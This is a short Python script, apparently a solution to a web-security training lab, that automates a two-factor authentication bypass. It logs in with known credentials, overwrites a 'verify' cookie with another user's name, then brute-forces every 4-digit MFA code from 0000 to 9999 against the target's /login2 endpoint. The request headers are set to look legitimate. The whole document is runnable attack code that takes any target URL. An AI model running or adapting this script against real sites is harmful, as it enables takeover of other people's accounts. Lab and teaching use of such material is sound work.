import requests
url=input("Enter the target URL: ").strip()
#headers for the request to look legitimate
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": url + "/login",
    "Origin": url
}
#creating a session to persist cookies
session = requests.Session()
#function to bypass 2FA using broken logic
'''
In this function, we first login with known credentials.
Then we observe that the application sets a cookie named 'verify' with value which consists of attacker's credentials after successful login.
so we overwrite that cookie with another user's username to bypass 2FA.
We observe that mfa code is 4 digit numeric code.
We brute force all possible combinations from 0000 to 9999 and check for redirect status code to confirm successful bypass.
'''
def two_fa_bypass():
    data = {
        "username": "wiener",
        "password": "peter"
    }
    response = session.post(url + "/login",data=data,headers=headers,allow_redirects=False)
    if response.status_code == 302:
        print("Login successful as wiener")
    else:
        print("login failed")
        exit()
    session.cookies.set("verify","carlos")
    print("Overwriting cookie to bypass 2FA")
    res=session.get(url + "/login2",headers=headers,allow_redirects=False)
    for i in range(0,10000):
        mfa_code=str(i).zfill(4)
        print(f"Response length: {len(res.text)}")
        print(f"Trying MFA code: {mfa_code}")
        mfa={
            "mfa-code":mfa_code
        }
        res = session.post(url + "/login2", headers=headers, data=mfa, allow_redirects=False)
        if res.status_code == 302:
            return mfa_code
    return None
#call the function to bypass 2FA
mfa_code=two_fa_bypass()
if mfa_code:
    print(f"Bypassed 2FA successfully with code: {mfa_code}")
else:
    print("Failed to bypass 2FA")